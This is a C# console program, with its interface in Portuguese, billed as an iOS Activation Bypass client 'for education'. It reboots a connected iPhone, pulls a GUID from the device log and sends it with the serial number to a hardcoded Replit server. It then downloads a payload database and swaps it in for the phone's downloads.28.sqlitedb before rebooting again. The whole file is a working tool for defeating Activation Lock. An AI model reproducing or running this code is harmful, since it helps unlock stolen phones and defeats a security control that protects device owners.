using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace GoIosBypassSuite
{
    public class GoIosDevice
    {
        public string Udid { get; set; }
        public string DeviceName { get; set; }
        public string ProductVersion { get; set; }
        public string ProductType { get; set; }
        public string HardwareModel { get; set; }
        public Dictionary<string, object> DeviceValues { get; set; }
    }

    class Program
    {
        private const string TOOL_EXEC = "iOS.exe";
        private static string REMOTE_API = "https://64aebe5a-bacf-4267-901a-e999548dfc6e-00-1n1v4ownae3r2.worf.replit.dev";
        private const int TRIGGER_TIMEOUT = 300;

        private static readonly HttpClient _httpClient = new HttpClient();
        private static GoIosDevice _targetDevice;
        private static Process _tunnelProcess;

        static async Task Main(string[] args)
        {
            Console.OutputEncoding = System.Text.Encoding.UTF8;
            PrintMenu();
            
            while (true)
            {
                Console.WriteLine("\n╔════════════════════════════════════════╗");
                Console.WriteLine("║  iOS Activation Bypass - Menu Principal ║");
                Console.WriteLine("╠════════════════════════════════════════╣");
                Console.WriteLine("║  [1] Replit (Cloud)                    ║");
                Console.WriteLine("║  [2] Localhost (Local)                 ║");
                Console.WriteLine("║  [3] URL Customizada                   ║");
                Console.WriteLine("║  [4] Sair                              ║");
                Console.WriteLine("╚════════════════════════════════════════╝");
                Console.Write("\nEscolha: ");

                string choice = Console.ReadLine();

                switch (choice)
                {
                    case "1":
                        REMOTE_API = "https://64aebe5a-bacf-4267-901a-e999548dfc6e-00-1n1v4ownae3r2.worf.replit.dev";
                        Console.WriteLine("\n✓ Usando Replit (Cloud)");
                        await RunBypass();
                        break;
                    case "2":
                        REMOTE_API = "http://localhost:5000";
                        Console.WriteLine("\n✓ Usando Localhost");
                        await RunBypass();
                        break;
                    case "3":
                        Console.Write("\nDigite a URL: ");
                        string customUrl = Console.ReadLine();
                        REMOTE_API = customUrl;
                        Console.WriteLine($"\n✓ Usando URL: {REMOTE_API}");
                        await RunBypass();
                        break;
                    case "4":
                        Console.WriteLine("\n[*] Encerrando...");
                        Environment.Exit(0);
                        break;
                    default:
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[-] Opção inválida!");
                        Console.ResetColor();
                        break;
                }
            }
        }

        private static void PrintMenu()
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("╔══════════════════════════════════════════════════════════╗");
            Console.WriteLine("║                                                          ║");
            Console.WriteLine("║      iOS Activation Bypass Client - Windows              ║");
            Console.WriteLine("║                                                          ║");
            Console.WriteLine("║      Desenvolvido para MIT - Educação                    ║");
            Console.WriteLine("║                                                          ║");
            Console.WriteLine("╚══════════════════════════════════════════════════════════╝");
            Console.ResetColor();
        }

        private static async Task RunBypass()
        {
            try
            {
                CheckEnvironment();
                
                Log("▶ Iniciando sequência...", ConsoleColor.Cyan);
                await Task.Delay(1000);

                Log("[*] Esperando dispositivo...", ConsoleColor.White);
                _targetDevice = await WaitForDevice(30);
                Log($"[✓] Conectado: {_targetDevice.DeviceName} ({_targetDevice.ProductType})", ConsoleColor.Green);
                Log($"[✓] UDID: {_targetDevice.Udid}", ConsoleColor.Green);

                StartTunnelDaemon();

                Log("\n[!] Pressione ENTER para iniciar a sequência...", ConsoleColor.Yellow);
                Console.ReadLine();

                await RunSequence();

                Log("\n" + new string('=', 50), ConsoleColor.Green);
                Log("[✓✓✓] SEQUÊNCIA CONCLUÍDA COM SUCESSO! [✓✓✓]", ConsoleColor.Green);
                Log(new string('=', 50), ConsoleColor.Green);
            }
            catch (Exception ex)
            {
                Log($"\n[-] ERRO: {ex.Message}", ConsoleColor.Red);
            }
            finally
            {
                CleanupTunnel();
                Log("\n[*] Operação finalizada.", ConsoleColor.Yellow);
            }
        }

        private static async Task RunSequence()
        {
            Log("\n" + new string('═', 50), ConsoleColor.Magenta);
            Log("FASE 1: Reset Inicial", ConsoleColor.Magenta);
            Log(new string('═', 50), ConsoleColor.Magenta);
            RunGoIosCommand("reboot");
            await WaitForDeviceReconnection(120);

            Log("\n" + new string('═', 50), ConsoleColor.Magenta);
            Log("FASE 2: Extração do GUID", ConsoleColor.Magenta);
            Log(new string('═', 50), ConsoleColor.Magenta);
            string guid = await ExtractGuidFromSyslog();
            Log($"[✓] GUID encontrado: {guid}", ConsoleColor.Green);

            Log("\n" + new string('═', 50), ConsoleColor.Magenta);
            Log("FASE 3: Autorização do Servidor", ConsoleColor.Magenta);
            Log(new string('═', 50), ConsoleColor.Magenta);
            string downloadUrl = await GetPayloadUrl(_targetDevice.ProductType, guid, GetSerialNumber(_targetDevice));
            Log($"[✓] URL do Payload: {downloadUrl}", ConsoleColor.Green);

            Log("\n" + new string('═', 50), ConsoleColor.Magenta);
            Log("FASE 4: Download do Payload", ConsoleColor.Magenta);
            Log(new string('═', 50), ConsoleColor.Magenta);
            string localFile = "payload.db";
            await DownloadFile(downloadUrl, localFile);
            Log($"[✓] Download concluído ({new FileInfo(localFile).Length} bytes)", ConsoleColor.Green);

            Log("\n" + new string('═', 50), ConsoleColor.Magenta);
            Log("FASE 5: Limpeza de Artefatos", ConsoleColor.Magenta);
            Log(new string('═', 50), ConsoleColor.Magenta);
            RemoveRemoteFile("/Downloads/downloads.28.sqlitedb");
            RemoveRemoteFile("/Downloads/downloads.28.sqlitedb-shm");
            RemoveRemoteFile("/Downloads/downloads.28.sqlitedb-wal");
            Log("[✓] Arquivos antigos removidos", ConsoleColor.Green);

            Log("\n" + new string('═', 50), ConsoleColor.Magenta);
            Log("FASE 6: Injeção de Payload", ConsoleColor.Magenta);
            Log(new string('═', 50), ConsoleColor.Magenta);
            PushFile(localFile, "/Downloads/downloads.28.sqlitedb");
            File.Delete(localFile);
            Log("[✓] Payload injetado com sucesso", ConsoleColor.Green);

            Log("\n" + new string('═', 50), ConsoleColor.Magenta);
            Log("FASE 7: Reboot de Aplicação", ConsoleColor.Magenta);
            Log(new string('═', 50), ConsoleColor.Magenta);
            RunGoIosCommand("reboot");
            await WaitForDeviceReconnection(300);
            Log("[✓] Dispositivo reconectado", ConsoleColor.Green);

            Log("\n[✓] Sequência finalizada com êxito!", ConsoleColor.Green);
        }

        private static void StartTunnelDaemon()
        {
            Log("[*] Iniciando Tunnel do iOS...", ConsoleColor.Yellow);
            try
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = TOOL_EXEC,
                    Arguments = "tunnel start",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                _tunnelProcess = Process.Start(startInfo);
                Thread.Sleep(3000);

                if (_tunnelProcess.HasExited)
                {
                    throw new Exception("Tunnel falhou ao iniciar");
                }
                Log("[✓] Tunnel ativo", ConsoleColor.Green);
            }
            catch (Exception ex)
            {
                Log($"[-] Erro no Tunnel: {ex.Message}", ConsoleColor.Red);
                throw;
            }
        }

        private static void CleanupTunnel()
        {
            if (_tunnelProcess != null && !_tunnelProcess.HasExited)
            {
                try { _tunnelProcess.Kill(); } catch { }
            }
        }

        private static string RunGoIosCommand(string args)
        {
            var psi = new ProcessStartInfo
            {
                FileName = TOOL_EXEC,
                Arguments = args,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (var p = Process.Start(psi))
            {
                string output = p.StandardOutput.ReadToEnd();
                string error = p.StandardError.ReadToEnd();
                p.WaitForExit();

                if (p.ExitCode != 0 && !string.IsNullOrEmpty(error))
                {
                    if (!error.Contains("warn", StringComparison.OrdinalIgnoreCase))
                        Log($"[!] {args}: {error.Trim()}", ConsoleColor.Yellow);
                }

                return output;
            }
        }

        private static void PushFile(string localPath, string remotePath)
        {
            Log($"    → Enviando {Path.GetFileName(localPath)} → {remotePath}", ConsoleColor.DarkGray);
            RunGoIosCommand($"fsync push --srcPath=\"{localPath}\" --dstPath=\"{remotePath}\"");
        }

        private static void RemoveRemoteFile(string remotePath)
        {
            Log($"    → Deletando {remotePath}", ConsoleColor.DarkGray);
            RunGoIosCommand($"fsync rm --path=\"{remotePath}\"");
        }

        private static async Task<bool> WaitForRemoteFile(string remotePath, int timeoutSeconds)
        {
            var end = DateTime.Now.AddSeconds(timeoutSeconds);
            while (DateTime.Now < end)
            {
                string output = RunGoIosCommand($"fsync tree --path=\"{remotePath}\"");

                if (!string.IsNullOrWhiteSpace(output) && !output.Contains("no such file") && !output.Contains("error"))
                    return true;

                await Task.Delay(2000);
            }
            return false;
        }

        private static async Task<string> ExtractGuidFromSyslog()
        {
            Log("[*] Procurando GUID nos logs do dispositivo...", ConsoleColor.White);

            var psi = new ProcessStartInfo
            {
                FileName = TOOL_EXEC,
                Arguments = "syslog",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                CreateNoWindow = true
            };

            using (var p = Process.Start(psi))
            {
                var cts = new System.Threading.CancellationTokenSource();
                string foundGuid = null;

                _ = Task.Run(async () =>
                {
                    string line;
                    while ((line = await p.StandardOutput.ReadLineAsync()) != null)
                    {
                        if (line.Contains("BLDatabaseManager.sqlite"))
                        {
                            var match = Regex.Match(line, @"SystemGroup/([A-F0-9\-]{36})");
                            if (match.Success)
                            {
                                foundGuid = match.Groups[1].Value;
                                cts.Cancel();
                            }
                        }
                    }
                }, cts.Token);

                try { await Task.Delay(60000, cts.Token); } catch (TaskCanceledException) { }

                try { p.Kill(); } catch { }

                if (foundGuid == null) throw new Exception("GUID não encontrado nos logs");
                return foundGuid;
            }
        }

        private static async Task<GoIosDevice> WaitForDevice(int timeoutSec)
        {
            var end = DateTime.Now.AddSeconds(timeoutSec);
            while (DateTime.Now < end)
            {
                string json = RunGoIosCommand("list --details");
                try
                {
                    if (json.Contains("UDID"))
                    {
                        var devices = JsonSerializer.Deserialize<List<GoIosDevice>>(json);
                        if (devices != null && devices.Count > 0) return devices[0];
                    }

                    var root = JsonDocument.Parse(json);
                    if (root.RootElement.TryGetProperty("devices", out var devArray) && devArray.GetArrayLength() > 0)
                    {
                        var first = devArray[0];
                        return new GoIosDevice
                        {
                            Udid = first.GetProperty("UDID").GetString(),
                            DeviceName = first.GetProperty("DeviceName").GetString(),
                            ProductType = first.GetProperty("ProductType").GetString()
                        };
                    }
                }
                catch { }

                await Task.Delay(2000);
            }
            throw new Exception("Nenhum dispositivo detectado");
        }

        private static async Task WaitForDeviceReconnection(int timeoutSec)
        {
            Log("[*] Esperando reconexão do dispositivo...", ConsoleColor.Yellow);
            await Task.Delay(10000);
            await WaitForDevice(timeoutSec);
            Log("[✓] Dispositivo reconectado", ConsoleColor.Green);
        }

        private static async Task<string> GetPayloadUrl(string model, string guid, string sn)
        {
            var url = $"{REMOTE_API}?prd={model}&guid={guid}&sn={sn}";
            var response = await _httpClient.GetStringAsync(url);
            return response.Trim();
        }

        private static async Task DownloadFile(string url, string path)
        {
            var data = await _httpClient.GetByteArrayAsync(url);
            await File.WriteAllBytesAsync(path, data);
        }

        private static string GetSerialNumber(GoIosDevice device)
        {
            if (device.DeviceValues != null && device.DeviceValues.ContainsKey("SerialNumber"))
                return device.DeviceValues["SerialNumber"].ToString();
            return "UNKNOWN_SN";
        }

        private static void CheckEnvironment()
        {
            if (!File.Exists(TOOL_EXEC))
            {
                throw new FileNotFoundException($"Não foi possível encontrar {TOOL_EXEC}. Coloque o arquivo na mesma pasta do programa.");
            }
        }

        private static void Log(string message, ConsoleColor color)
        {
            Console.ForegroundColor = color;
            Console.WriteLine(message);
            Console.ResetColor();
        }
    }
}
